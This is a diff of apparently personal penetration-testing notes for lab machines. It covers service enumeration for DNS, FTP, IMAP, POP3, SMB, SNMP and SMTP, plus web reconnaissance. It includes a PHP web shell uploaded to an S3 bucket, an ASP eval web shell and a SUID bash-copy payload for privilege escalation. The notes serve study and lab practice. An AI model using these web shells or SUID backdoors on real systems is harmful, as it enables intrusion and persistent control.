@@ -56,7 +56,7 @@ A shadow hash is the encrypted password of a local host. To crack it, we need th
 
 # Enumeration
 
-## Network
+## nmap
 
 Locate and list servers, services connected to the ntework.
 
@@ -210,9 +210,7 @@ Here some way to deal with them:
 
 - If the firewall accepts `TCP port 53`, it is very likely that IDS/IPS filters might also be configured much  weaker than others. We can test this by trying to connect to this port  by using `Netcat`.
 
-​	
-
-### Fingerprinting
+## Fingerprinting
 
 Get as much information about server and network
 
@@ -241,8 +239,7 @@ Get as much information about server and network
   - v3: security measure, encryption and authentication
   - [onesixtyone](https://github.com/trailofbits/onesixtyone) can be used to brute force the community string names using a dictionary file of common community strings such as the `dict.txt` file included in the GitHub repo for the tool.
 
-
-### Services
+## Services
 
 **Services:**
 
@@ -261,7 +258,7 @@ Get as much information about server and network
 - 22, 2222 -> SSH
 - 1433, 3306, 5432, 27017 -> DB: MsSQLS, MySQL, PSQL, Mongo
 
-**nxc**
+## nxc
 
 Generic tool to navigate all the authentication protocols. The guide: https://www.netexec.wiki/
 
@@ -279,226 +276,139 @@ Possible protocols:
 	- winrm
 	- msSQL
 
+# Network
 
-
-## Web
-
-### Directories and files
-
-Gbuster or Ffuf to discover hidden files or directories
-
-```bash
-gobuster dir -u {IP} -w {/usr/share/seclists/Discovery/Web-Content/WORDLIST}
-```
-
--  **HTTP status code** 
-   -  `200`  request was successful
-   -  `403`  forbidden to access the resource.
-   -  `301`  being redirected (not a failure case)
-
-**Important files:**
-
-- `.swp` *swap files:* 
-
-  Swap files store the changes that are made to the buffer. If Vim or your computer crashes, the swap files allow you to recover those changes. Swap files also provide a way to avoid multiple instances of an editor from editing the same file.
-
-  - `vim -r [swap file]` to read it
-  - `strings [swap file]`  to only display the human-readable text if the file is unrecoverable
-
-- **robots.txt** 
-
-  It is common for websites to contain a `robots.txt` file,  whose purpose is to instruct search engine web crawlers such as  Googlebot which resources can and cannot be accessed for indexing. The `robots.txt` file can provide valuable information such as the location of private files and admin pages. 
-
-### DNS Subdomains
-
-1. Manual search:
-
-   - **SSL certificate**
-
-   - **DNS records**
-
-     To display all the available DNS records:
-
-     ```bash
-     dig any [DOMAIN]
-     ```
-
-     The records output will be divided in categories:
-
-     - `A` records: We recognize the IP addresses that point to a specific (sub)domain. 
-     - `MX` records: show which mail  server is responsible for managing the emails for the company. 
-     - `NS` records: show which name servers are used to resolve the FQDN to IP addresses. Most hosting  providers use their own name servers, making it easier to identify the hosting provider.
-     - `TXT` records: often contains verification keys for different third-party providers and other security aspects of DNS, such as [SPF](https://datatracker.ietf.org/doc/html/rfc7208), [DMARC](https://datatracker.ietf.org/doc/html/rfc7489), and [DKIM](https://datatracker.ietf.org/doc/html/rfc6376), which are responsible for verifying and confirming the origin of the  emails sent.
-
-   - **Certificate Transparency (CT) logs:**  SSL certificate providers share the CT with the website https://crt.sh/, which stores everything in a database.
-
-     Certificate Transparency (CT) is an Internet security standard for monitoring and auditing the issuance of digital certificates. When an Internet user interacts with a website, a trusted third party  is needed for assurance that the website is legitimate and that the  website's encryption key is valid.
-
-     To look them up from the terminal and filter by unique subdomains:
-
-     ```bash
-      curl -s https://crt.sh/\?q\=[DOMAIN]\&output\=json | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -u | tee subdomainlist.txt
-     ```
-
-     Then one can grep the ones with an IP address:
-
-     ```bash
-     for i in $(cat subdomainlist);do host $i | grep "has address" | grep [DOMAIN]| cut -d" " -f4 >> ip-addresses.txt;done
-     ```
-
-     And use [Shodan](https://www.shodan.io/) to find devices and systems permanently connected to the Internet like `Internet of Things` (`IoT`). It searches the Internet for open TCP/IP ports and filters the systems according to specific terms and criteria.
-
-     ```bash
-     for i in $(cat ip-addresses.txt);do shodan host $i;done
-     ```
-
-     Often cloud storage is added to the DNS list when used for administrative purposes by other employees. 
-
-2. Fuzzing:
-
-   ```bash
-   gobuster dns -d {URL} -w /usr/share/secLists/Discovery/DNS/{WORDLIST}
-   ```
-
-3. Add DNS Server to the `/etc/resolv.conf` file.
-
-### Other Informations
-
-- **Banner Grabbing**:
-
-  - ```bash
-    curl -IL {URL}
-    ```
-
-- **Eyewitness:** can be used to take screenshots of target web applications, fingerprint them, and identify possible default credentials.
-
-  - ```bash
-    echo "{URLS}" > urls.txt 
-    ```
-
-  - ```bash
-    eyewitness -f urls.txt -d screens
-    ```
-
-- **Whatweb:** We can extract the version of web servers, supporting frameworks, and applications
-
-  - ```bash
-    whatweb {IP}
-    ```
-
-- **SSL/TLS Certificates:**bviewing the certificate could reveal details, such as the email  address and company name. These could potentially be used to conduct a  *phishing attack*.
-
-- **source code** `CRTL + U`
-
-- **StaffL**
-
-  - Employees can be identified on various business networks such as [LinkedIn](https://www.linkedin.com) or [Xing](https://www.xing.de). Job postings from companies can also tell us a lot about their  infrastructure and give us clues about what we should be looking for.
-  - Github projects from employees could reveal personal information
-
-
-### Cloud
-
-`Amazon` (`AWS`), `Google` (`GCP`), and `Microsoft` (`Azure`) 
-
-- DNS enumeration:
-
-  Often cloud storage is added to the DNS list when used for administrative purposes by other employees. 
-
-- Google search:
-
-- Third-party providers 
-
-  -  [domain.glass](https://domain.glass) 
-  -  [GrayHatWarfare](https://buckets.grayhatwarfare.com). We can do many different searches, discover AWS, Azure, and GCP cloud  storage, and even sort and filter by file format. Therefore, once we  have found them through Google, we can also search for them on  GrayHatWarefare and passively discover what files are stored on the  given cloud storage. SSH keys could be also leaked here.
-
-#### Amazon Buckets
-
-The are different types of subdomains, for example `s3.` are amazon buckets subdomains on the cloud. Always add the subdomains to the `/ets/hosts/` file next to the domain..
-
-Use `awscli` to interact with them. 
-
-To list the buckets:
-`aws --endpoint=http://s3.thetoppers.htb s3 ls`
-
-To list the objects inside the buckets just specify the bucket at the end of the previous command:
-
-```bash
-aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
-```
-
-If php files are shown, it means that the bucket is handling the php page. Thus creating an appropriate php file and coping it in the bucket, will open a shell:
-
-```bash
-echo '<?php system($_GET["cmd"]); ?>' > shell.php
-aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
-```
-
-
-
-# Exploitation
-
-## General
-
-Public Exploits:** 
-
-- `searchsploit` 
-
-  - `-x` opens  the code
-
-- google
-
-- https://sploitus.com/, [Exploit DB](https://www.exploit-db.com), [Rapid7 DB](https://www.rapid7.com/db/), or [Vulnerability Lab](https://www.vulnerability-lab.com)
-
-- Metasploit:
-
-  - `msfconsole`
-
-    Any option with `Required` set to `yes` needs to be set for the exploit to work.
-
-    ```bash
-    > search exploit {exploit_found_with_searchsploit}
-    > use {exploit}
-    > show options {exploit}
-    > set {option name} {option value}
-    > check
-    > exploit
-    ```
-
-**Conventions:**:
-
-- 2.7.1 *Only this version* 
-- 2.7.x *All the versions starting with 2.7*
-- 2.7.x x<2 *Versions smaller or equal than this one on the x digit*
-- 2.7.1 < *Versions smaller or equal than this one  maybe only on the last digit*
-
-##  Network
+## Service Hacking
 
 ### DNS T53
 
-**Type:**
-
-**Generalities:**
+#### Generalities:
 
 - Purpose:
 
-  `Domain Name System` (`DNS`) is a system for resolving computer names into IP addresses. Globally distributed DNS servers translate domain names into IP  addresses and thus control which server a user can reach via a  particular domain. 
+  - DNS servers translate domain names into IP addresses and thus control which server a user can reach via a  particular domain. 
+  - It stores and outputs additional information about the services associated with a domain.
+
+- Encryption:
+
+  DNS is mainly unencrypted. Devices on the local WLAN and Internet  providers can therefore hack in and spy on DNS queries. Since this poses a privacy risk, there are now some solutions for DNS encryption. By  default, IT security professionals apply `DNS over TLS` (`DoT`) or `DNS over HTTPS` (`DoH`) here. In addition, the network protocol `DNSCrypt` also encrypts the traffic between the computer and the name server.
 
 - Types of DNS Servers:
 
-  - DNS root server
-  - Authoritative name server
-  - Non-authoritative name server
-  - Caching server
-  - Forwarding server
-  - Resolver
+  - *DNS root server*
+
+    responsible for the top-level domains (`TLD`). As the last instance, they are only requested if the name server does not respond. 
+
+  - *Authoritative name server*
+
+    hold authority for a particular zone. They only answer queries from their area of responsibility,
+
+  - *Non-authoritative name server*
+
+     they collect information on specific DNS zones
+
+  - *Caching server*
+
+    cache information from other name servers for a specified period. The  authoritative name server determines the duration of this storage.
+
+  - *Forwarding server*
+
+    forward DNS queries to another DNS server.
+
+  - *Resolver*
+
+    perform name resolution locally
+
+- DNS records:
+
+  - `A`  Returns an IPv4 address of the requested domain 
+  - `AAAA`  Returns an IPv6 address of the requested domain.
+  - `MX`  Returns the responsible mail servers 
+  - `NS`  Returns the DNS servers (nameservers) of the domain.
+  - `TXT`  Contains various information
+  - `CNAME`  Serves as an alias for another domain name.
+  - `PTR`  Converts IP addresses into valid domain names.
+  - `SOA`  Provides information about the corresponding DNS zone and email address of the administrative contact.
+
+
+**Configuration**
+
+- *Local DNS configurations files*
+  - [Bind9](https://www.isc.org/bind/) is often used on Linux
+  - Different zones are defined here
+  - The local conf files are usually:
+    - `named.conf.local`
+    - `named.conf.options`
+    - `named.conf.log`
+  - Dangerous settings:
+    - `allow-query`  Defines which hosts are allowed to send requests to the DNS server.
+    - `allow-recursion`  Defines which hosts are allowed to send recursive requests to the DNS server.
+    - `allow-trnasfer`  Defines which hosts are allowed to receive zone transfers from the DNS server.
+    - `zone-statistics`  Collects statistical data of zones.
+  
+- *zone files* `/etc/bind/db.domain.com`
+
+  Text file that describes a DNS zone with the BIND file format. 
+
+   There must be precisely one `SOA` record (usually at the beginning) and at least one `NS` record. 
+
+- *reverse name resolution files* `/etc/bind/db.10.129.14`
+
+  The computer name (FQDN) is assigned to the last octet of an IP address, which corresponds to the respective host, using a `PTR` record., which are responsible for the reverse translation of IP addresses into names.
+
+#### Footprinting
+
+- Name Servers:
+
+  ```bash
+  dig ns [NAME_SERVER] @[DNS SERVER] {+short}
+  ```
+
+- Version:
+
+  ```bash
+  dig CH TXT version.bind [DNS SERVER]
+  ```
+
+- View all available records
+
+  ```bash
+  dig ANY [NAME_SERVER] @[DNS SERVER]
+  ```
+
+- Zone Transfer
+
+  Transfer of zones to another server in DNS, This procedure is abbreviated `Asynchronous Full Transfer Zone` (`AXFR`)
+
+   DNS server that serves as a direct source for synchronizing a zone file is called a master. A DNS server that obtains zone data from a master  is called a slave. The slave fetches the `SOA` record of the relevant zone from  the master at certain intervals, the so-called refresh time, usually one hour, and compares the serial numbers. If the serial number of the SOA  record of the master is greater than that of the slave, the data sets no longer match.
+
+  ```
+  dig axfr [NAME_SERVER] @[DNS SERVER]
+  ```
+
+  If the administrator used a subnet for the `allow-transfer` option or set it to `any`, everyone would query the entire zone file at the DNS server. In addition, other zones can be queried, which may even show internal IP addresses and hostnames.
+
+  ```
+  dig axfr [ZONE].[NAME_SERVER] @[DNS SERVER]
+  ```
+
+  The individual `A` records with the hostnames can also be found out with the help of a brute-force attack:
+
+  - If the Zone transfer fails, it means that you don't have access to those subdomain, thus you can do *SubDomain Brute Forcing* [DNSenum](https://github.com/fwaeytens/dnsenum)
+
+
+  ```bash
+  dnsenum --dnsserver [DNS_SERVER] --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt [DOMAIN]
+  ```
+
 
 ### FTP T21
+
+#### Generalities:
 
 **Type:** 
 
 Authentication, Read/Write
-
-**Generalities:**
 
 - Protocol:
 
@@ -510,11 +420,7 @@ Authentication, Read/Write
 
 - [List of FTP return codes](https://en.wikipedia.org/wiki/List_of_FTP_server_return_codes)
 
-**Authentication:**
-
-- Anonymous login: anonymous:anonymous
-
-**Interaction:**
+#### Interaction:
 
 - `ftp`
 
@@ -541,7 +447,9 @@ Authentication, Read/Write
 
 - netcat/telnet
 
-**Exploit:**
+#### Exploit:
+
+- Anonymous login: anonymous:anonymous
 
 - File upload
   - LFI
@@ -556,15 +464,70 @@ Authentication, Read/Write
 - Possible settings: [man page](http://vsftpd.beasts.org/vsftpd_conf.html).
 - `/etc/ftpusers` is used to deny certain users access to the FTP service.
 
+### IMAP T143, T993
 
+#### Generalities:
+
+**Type:** mail
+
+- Purpose:
+  - Access emails from a mail server
+  - Allows online management on the server (supports folders)
+  - Authentication to the desire mailbox
+  - No-encryption: transmits commands, emails, or usernames and passwords in plain text.
+  - SSL/TLS to require an encrypted session (on the higher port if present)
+
+#### Configuration
+
+In the documentation of Dovecot, we can find the individual [core settings](https://doc.dovecot.org/settings/core/) and [service configuration](https://doc.dovecot.org/configuration_manual/service_configuration/) options.
+
+**Dangerous Settings:**
+
+| **Setting**               | **Description**                                              |
+| ------------------------- | ------------------------------------------------------------ |
+| `auth_debug`              | Enables all authentication debug logging.                    |
+| `auth_debug_passwords`    | This setting adjusts log verbosity, the submitted passwords, and the scheme gets logged. |
+| `auth_verbose`            | Logs unsuccessful authentication attempts and their reasons. |
+| `auth_verbose_passwords`  | Passwords used for authentication are logged and can also be truncated. |
+| `auth_anonymous_username` | This specifies the username to be used when logging in with the ANONYMOUS SASL mechanism. |
+
+#### Interaction
+
+- nmap will return the available commands that can be executed
+
+- If we discover the credentials:
+
+  ```bash
+  curl -k 'imaps://[IP]' --user user:password -v
+  ```
+
+  -  `verbose` (`-v`) we can see the version of TLS used for  encryption, further details of the SSL certificate, and even the banner, which could contain the version of the mail server.
+
+- To connect via openssl (also `netcat` is possible):
+
+  ```bash
+  openssl s_client -connect [IP]:imaps
+  ```
+
+| **Command**                     | **Description**                                              |
+| ------------------------------- | ------------------------------------------------------------ |
+| `1 LOGIN username password`     | User's login.                                                |
+| `1 LIST "" *`                   | Lists all directories.                                       |
+| `1 CREATE "INBOX"`              | Creates a mailbox with a specified name.                     |
+| `1 DELETE "INBOX"`              | Deletes a mailbox.                                           |
+| `1 RENAME "ToRead" "Important"` | Renames a mailbox.                                           |
+| `1 LSUB "" *`                   | Returns a subset of names from the set of names that the User has declared as being `active` or `subscribed`. |
+| `1 SELECT INBOX`                | Selects a mailbox so that messages in the mailbox can be accessed. |
+| `1 UNSELECT INBOX`              | Exits the selected mailbox.                                  |
+| `1 FETCH <ID> all`              | Retrieves data associated with a message in the mailbox.     |
+| `1 CLOSE`                       | Removes all messages with the `Deleted` flag set.            |
+| `1 LOGOUT`                      | Closes the connection with the IMAP server.                  |
 
 ### NFS TU111, TU2049
 
-**Type:** 
+#### Generalities:
 
-Reade/Write, Authentication only for v4
-
-**Generalities:**
+**Type:** Reade/Write, Authentication only for v4
 
 - Purpose:
 
@@ -578,7 +541,7 @@ Reade/Write, Authentication only for v4
 
   NFS is based on the [Open Network Computing Remote Procedure Call](https://en.wikipedia.org/wiki/Sun_RPC) (`ONC-RPC`/`SUN-RPC`) protocol exposed on `TCP` and `UDP` ports `111`, which uses [External Data Representation](https://en.wikipedia.org/wiki/External_Data_Representation) (`XDR`) for the system-independent exchange of data. The NFS protocol has no mechanism for authentication or authorization. Instead, authentication is completely shifted to the RPC protocol's options. The most common authentication is via UNIX `UID`/`GID` and `group memberships`.
 
-**Configuration**
+#### Configuration
 
 - `/etc/exports`
   - The [NFS Exports Table](http://manpages.ubuntu.com/manpages/trusty/man5/exports.5.html) shows the possible options of the file
@@ -598,7 +561,7 @@ Reade/Write, Authentication only for v4
     - `nohide`  If another file system was mounted below an exported directory, this directory is exported by its own exports entry. 
       - Dangerous
 
-**Navigation**
+#### Navigation
 
 - Show available Shares that can be mouted
 
@@ -630,27 +593,78 @@ Reade/Write, Authentication only for v4
 
   
 
-**Exploit:**
+#### Exploit:
 
 - If we have access to the system via SSH and want to read files from another folder that a specific user can read, we would need to upload a shell to the NFS share that has the `SUID` of that user and then run the shell via the SSH user.
 
+### POP3 T110, T995
 
+#### Generalities:
 
+**Type:** mail
 
+- Purpose:
+  - Access emails from a mail server
+  - Allows online listing retrieving and deleting emails
+  - Authentication to the desire mailbox
+  - SSL/TLS to require an encrypted session (on the higher port if present)
+
+#### Configuration
+
+In the documentation of Dovecot, we can find the individual [core settings](https://doc.dovecot.org/settings/core/) and [service configuration](https://doc.dovecot.org/configuration_manual/service_configuration/) options.
+
+**Dangerous Settings:**
+
+| **Setting**               | **Description**                                              |
+| ------------------------- | ------------------------------------------------------------ |
+| `auth_debug`              | Enables all authentication debug logging.                    |
+| `auth_debug_passwords`    | This setting adjusts log verbosity, the submitted passwords, and the scheme gets logged. |
+| `auth_verbose`            | Logs unsuccessful authentication attempts and their reasons. |
+| `auth_verbose_passwords`  | Passwords used for authentication are logged and can also be truncated. |
+| `auth_anonymous_username` | This specifies the username to be used when logging in with the ANONYMOUS SASL mechanism. |
+
+#### Interaction
+
+- nmap will return the available commands that can be executed
+
+- If we discover the credentials:
+
+  ```bash
+  curl -k 'pop3s://[IP]' --user user:password -v
+  ```
+
+  -  `verbose` (`-v`) we can see the version of TLS used for  encryption, further details of the SSL certificate, and even the banner, which could contain the version of the mail server.
+
+- To connect via openssl:
+
+  ```bash
+  openssl s_client -connect [IP]:pop3s
+  ```
+
+| **Command**     | **Description**                                             |
+| --------------- | ----------------------------------------------------------- |
+| `USER username` | Identifies the user.                                        |
+| `PASS password` | Authentication of the user using its password.              |
+| `STAT`          | Requests the number of saved emails from the server.        |
+| `LIST`          | Requests from the server the number and size of all emails. |
+| `RETR id`       | Requests the server to deliver the requested email by ID.   |
+| `DELE id`       | Requests the server to delete the requested email by ID.    |
+| `CAPA`          | Requests the server to display the server capabilities.     |
+| `RSET`          | Requests the server to reset the transmitted information.   |
+| `QUIT`          | Closes the connection with the POP3 server.                 |
+
+​                          
 
 ### SMB T137-9/T445
 
-**Type:** 
+#### Generalities:
 
-Read/Write, Authentication
-
-**Generalities:**
+**Type:** Read/Write, Authentication
 
 - Purpose:
 
   - regulates access to files and entire directories and other network resources such as printers, routers, or interfaces released for the network. 
-
-  - Information exchange between different system processes 
+- Information exchange between different system processes 
 
 
   - The client can communicate with other  participants in the same network to access files or services shared with it on the network
@@ -662,7 +676,7 @@ Read/Write, Authentication
 
   In a network, each host participates in the same `workgroup`. A workgroup is a group name that identifies an arbitrary collection of computers and their resources on an SMB network.
 
-**Footprinting**
+#### Footprinting
 
 - nmap
 
@@ -695,7 +709,7 @@ Read/Write, Authentication
 
 - [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
 
-**Navigation:**
+#### Navigation:
 
 - `smbclient -N -L //[IP ADDRESS]{/FOLDER}`
   
@@ -718,6 +732,149 @@ Read/Write, Authentication
 - `/etc/samba/smb.conf` to change settings
 - Dangerous settings:
   - `browseable - yes`: Allow listing available shares in the current share
+
+### SNMP U161
+
+#### Generalities:
+
+**Type:** Database
+
+- Purpose:
+  - monitor network devices
+  - handle configuration tasks and change settings remotely
+  - SNMP-enabled hardware includes routers, switches, servers, IoT devices...
+  - Sends traps over UDP port 162: data packets sent from the SNMP server to the client without  being explicitly requested. If a device is configured accordingly, an  SNMP trap is sent to the client once a specific event occurs on the  server-side. For the SNMP client and server to exchange the respective values, the  available SNMP objects must have unique addresses known on both sides. 
+- MIB
+  - Text file in which all queryable SNMP objects of a device are listed as a tree
+  - It contains at least one `Object Identifier` (`OID`) (a node in the tree, uniquely identified by a sequence of numbers), which, in addition to the necessary unique address and a name, also  provides information about the type, access rights, and a description of the respective object.
+- Authentication and Encryption
+  - Only in version 3 we have encryption and authentication via user:pass
+  - Community strings: in v2, determine whether the requested information can be viewed or not, thus can be seen as passwords
+
+#### Configuration
+
+- Daemon
+
+  - All the settings in the [manpage](http://www.net-snmp.org/docs/man/snmpd.conf.html).
+
+  - `cat /etc/snmp/snmpd.conf | grep -v "#" | sed -r '/^\s*$/d'`
+
+  - Dangerous Settings:
+
+  - | **Settings**                                     | **Description**                                              |
+    | ------------------------------------------------ | ------------------------------------------------------------ |
+    | `rwuser noauth`                                  | Provides access to the full OID tree without authentication. |
+    | `rwcommunity <community string> <IPv4 address>`  | Provides access to the full OID tree regardless of where the requests were sent from. |
+    | `rwcommunity6 <community string> <IPv6 address>` | Same access as with `rwcommunity` with the difference of using IPv6. |
+
+#### Interaction
+
+1. Query the OIDs with their information
+
+   ```bash
+   snmpwalk -v2c -c public [IP]
+   ```
+
+2. Brute-force community strings (if version 1,2)
+
+   ```bash
+   onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt [IP]
+   ```
+
+    [crunch](https://secf00tprint.github.io/blog/passwords/crunch/advanced/en) to create custom wordlists
+
+3. Brute-force OIDs after a community string is knows
+
+   ```bash
+   braa <community string>@<IP>:.1.3.6.*
+   ```
+
+   Remember to try also the community string `public`
+
+
+
+### SMTP T25 v T587
+
+#### Generalities:
+
+**Type: ** Email
+
+- Purpose:
+
+  - Sends emails in an IP network, often combined with the IMAP or POP3 protocols, which can fetch emails and send emails.
+  - Prevents spam using authentication mechanisms that allow only authorized users to send e-mails.
+
+- Used with SSL/TLS encryption.
+
+- Protocol:
+
+  ![image-20241104144603042](/home/damuna/.config/Typora/typora-user-images/image-20241104144603042.png)
+
+  1.  Authentication
+  2.  After sending his e-mail, the SMTP client, disassembles it into a header and a body and uploads both to the SMTP server.
+  3. Sometimes there is a *Mail Submission Agent* (`MSA`), or *Relay Server*, which checks the validity, i.e., the origin of the e-mail. 
+  4. The *Mail Transfer Agent* (`MTA`), the software basis for sending and receiving e-mails, checks the e-mail for size and spam and then stores it. 
+  5. Email is reassembled.
+  6. The *Mail Delivery Agent* (`MDA`) transfers it to the recipient's mailbox.
+
+- Downsides:
+
+  - No usable delivery confirmation: only an English-language error message, including the header of the undelivered message, is returned.
+
+  - Users are not authenticated when a connection is established, and the sender of an email is therefore unreliable. 
+
+    As a result, open SMTP relays are often misused to send spam en masse. The originators use arbitrary fake sender addresses for this purpose to not be traced (mail spoofing). 
+
+  - For this purpose, an extension for SMTP has been developed called `Extended SMTP` (`ESMTP`). When people talk about SMTP in general, they usually mean ESMTP.
+
+#### Configuration
+
+- `/etc/postfix/main.cf | grep -v "#" | sed -r "/^\s*$/d"`
+
+- Dangereous settings:
+
+  - Open Relay Configuration
+
+    `mynetworks = 0.0.0.0/0`
+
+    With this setting, this SMTP server can send fake emails and thus  initialize communication between multiple parties. Another attack  possibility would be to spoof the email and read it.
+
+#### Interaction
+
+- `telnet` list of response code [here](https://serversmtp.com/smtp-error/)
+  - `AUTH PLAIN`  authenticate the client.
+  - `HELO`  logs in with its computer name and thus starts the session.
+  - `MAIL FROM`  names the email sender.
+  - `RCPT TO`  names the email recipient.
+  - `DATA`  initiates the transmission of the email.
+  - `RSET`  aborts the initiated transmission but keeps the connection between client and server.
+  - `VRFY`  checks if a mailbox is available for message transfer, can enumerate existing users on the system
+  - `EXPN`  checks if a mailbox is available for messaging with this command.
+  - `NOOP`  equests a response from the server to prevent disconnection due to time-out.
+  - `QUIT`  terminates the session.
+
+- ```bash
+  telnet <ip> <port>
+  # Basic interactions
+  HELO <domain>
+  EHLO <domain>
+  VRFY root
+  VRFY testuser
+  # Sometimes we may have to work through a web proxy. 
+  CONNECT <ip>:<port> HTTP/1.0
+  # Send an email
+  MAIL FROM: <[USER]@[DOMAIN]>
+  RCPT TO: <[USER]@[DOMAIN]> NOTIFY=success,failure
+  DATA
+  ```
+
+#### Footprinting
+
+```bash
+smtp-user-enum -M <method VRFY, EXPN, RCPT > -u <WORDLISRT> -t <ip> -D dom
+```
+
+To try with domain usually only for RCPT.
 
 ### RDP 3389
 
@@ -805,9 +962,9 @@ tftp
 | `status`     | Shows the current status of tftp, including the current transfer  mode (ascii or binary), connection status, time-out value, and so on. |
 | `verbose`    | Turns verbose mode, which displays additional information during file transfer, on or off. |
 
-## Web
+# Web
 
-### Introduction
+## Introduction
 
 ### **HTTP Request**
 
@@ -855,7 +1012,159 @@ Parameters are very important to spot, and they are grouped in different categor
 
 `paramfuzz(query_url)` to fuzz get parameters
 
+## Enumeration
 
+### Directories and files
+
+Gbuster or Ffuf to discover hidden files or directories
+
+```bash
+gobuster dir -u {IP} -w {/usr/share/seclists/Discovery/Web-Content/WORDLIST}
+```
+
+-  **HTTP status code** 
+   -  `200`  request was successful
+   -  `403`  forbidden to access the resource.
+   -  `301`  being redirected (not a failure case)
+
+**Important files:**
+
+- `.swp` *swap files:* 
+
+  Swap files store the changes that are made to the buffer. If Vim or your computer crashes, the swap files allow you to recover those changes. Swap files also provide a way to avoid multiple instances of an editor from editing the same file.
+
+  - `vim -r [swap file]` to read it
+  - `strings [swap file]`  to only display the human-readable text if the file is unrecoverable
+
+- **robots.txt** 
+
+  It is common for websites to contain a `robots.txt` file,  whose purpose is to instruct search engine web crawlers such as  Googlebot which resources can and cannot be accessed for indexing. The `robots.txt` file can provide valuable information such as the location of private files and admin pages. 
+
+### DNS Subdomains
+
+1. Manual search:
+
+   - **SSL certificate**
+
+   - **DNS records**
+
+     To display all the available DNS records:
+
+     ```bash
+     dig any [DOMAIN]
+     ```
+
+     The records output will be divided in categories:
+
+     - `A` records: We recognize the IP addresses that point to a specific (sub)domain. 
+     - `MX` records: show which mail  server is responsible for managing the emails for the company. 
+     - `NS` records: show which name servers are used to resolve the FQDN to IP addresses. Most hosting  providers use their own name servers, making it easier to identify the hosting provider.
+     - `TXT` records: often contains verification keys for different third-party providers and other security aspects of DNS, such as [SPF](https://datatracker.ietf.org/doc/html/rfc7208), [DMARC](https://datatracker.ietf.org/doc/html/rfc7489), and [DKIM](https://datatracker.ietf.org/doc/html/rfc6376), which are responsible for verifying and confirming the origin of the  emails sent.
+
+   - **Certificate Transparency (CT) logs:**  SSL certificate providers share the CT with the website https://crt.sh/, which stores everything in a database.
+
+     Certificate Transparency (CT) is an Internet security standard for monitoring and auditing the issuance of digital certificates. When an Internet user interacts with a website, a trusted third party  is needed for assurance that the website is legitimate and that the  website's encryption key is valid.
+
+     To look them up from the terminal and filter by unique subdomains:
+
+     ```bash
+      curl -s https://crt.sh/\?q\=[DOMAIN]\&output\=json | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -u | tee subdomainlist.txt
+     ```
+
+     Then one can grep the ones with an IP address:
+
+     ```bash
+     for i in $(cat subdomainlist);do host $i | grep "has address" | grep [DOMAIN]| cut -d" " -f4 >> ip-addresses.txt;done
+     ```
+
+     And use [Shodan](https://www.shodan.io/) to find devices and systems permanently connected to the Internet like `Internet of Things` (`IoT`). It searches the Internet for open TCP/IP ports and filters the systems according to specific terms and criteria.
+
+     ```bash
+     for i in $(cat ip-addresses.txt);do shodan host $i;done
+     ```
+
+     Often cloud storage is added to the DNS list when used for administrative purposes by other employees. 
+
+2. Fuzzing:
+
+   ```bash
+   ffuf -u "http://searcher.htb" -H "Host: FUZZ.searcher.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -ac -acs advanced -mc all
+   ```
+
+3. Add DNS Server to the `/etc/resolv.conf` file.
+
+### Other Informations
+
+- **Banner Grabbing**:
+
+  - ```bash
+    curl -IL {URL}
+    ```
+
+- **Eyewitness:** can be used to take screenshots of target web applications, fingerprint them, and identify possible default credentials.
+
+  - ```bash
+    echo "{URLS}" > urls.txt 
+    ```
+
+  - ```bash
+    eyewitness -f urls.txt -d screens
+    ```
+
+- **Whatweb:** We can extract the version of web servers, supporting frameworks, and applications
+
+  - ```bash
+    whatweb {IP}
+    ```
+
+- **SSL/TLS Certificates:**bviewing the certificate could reveal details, such as the email  address and company name. These could potentially be used to conduct a  *phishing attack*.
+
+- **source code** `CRTL + U`
+
+- **StaffL**
+
+  - Employees can be identified on various business networks such as [LinkedIn](https://www.linkedin.com) or [Xing](https://www.xing.de). Job postings from companies can also tell us a lot about their  infrastructure and give us clues about what we should be looking for.
+  - Github projects from employees could reveal personal information
+
+
+### Cloud
+
+`Amazon` (`AWS`), `Google` (`GCP`), and `Microsoft` (`Azure`) 
+
+- DNS enumeration:
+
+  Often cloud storage is added to the DNS list when used for administrative purposes by other employees. 
+
+- Google search:
+
+- Third-party providers 
+
+  -  [domain.glass](https://domain.glass) 
+  -  [GrayHatWarfare](https://buckets.grayhatwarfare.com). We can do many different searches, discover AWS, Azure, and GCP cloud  storage, and even sort and filter by file format. Therefore, once we  have found them through Google, we can also search for them on  GrayHatWarefare and passively discover what files are stored on the  given cloud storage. SSH keys could be also leaked here.
+
+#### Amazon Buckets
+
+The are different types of subdomains, for example `s3.` are amazon buckets subdomains on the cloud. Always add the subdomains to the `/ets/hosts/` file next to the domain..
+
+Use `awscli` to interact with them. 
+
+To list the buckets:
+`aws --endpoint=http://s3.thetoppers.htb s3 ls`
+
+To list the objects inside the buckets just specify the bucket at the end of the previous command:
+
+```bash
+aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
+```
+
+If php files are shown, it means that the bucket is handling the php page. Thus creating an appropriate php file and coping it in the bucket, will open a shell:
+
+```bash
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
+```
+
+## Exploit
 
 ### Proxy
 
@@ -1047,10 +1356,6 @@ A `Web Shell` is typically a web script, i.e., `PHP` or `ASPX`, that accepts our
 <% eval request("cmd") %>
 ```
 
-## MSFVenom
-
-Get the shell from `msfconsole`, which is recommended for windows, use also the right listener from `msfconsole`
-
 ### Uploading a Web Shell
 
 Now we have to write one of the web shells above in the web root
@@ -1087,7 +1392,17 @@ Contra:
 
 - Not as interactive
 
+### Payload 
 
+- **Bash**
+
+  Copies bash, give SUID priviliges,
+
+  ```bash
+  echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/exp\nchmod 4777 /tmp/exp' > file_to_execute
+  ```
+
+  
 
 # Privilege Escalation
 
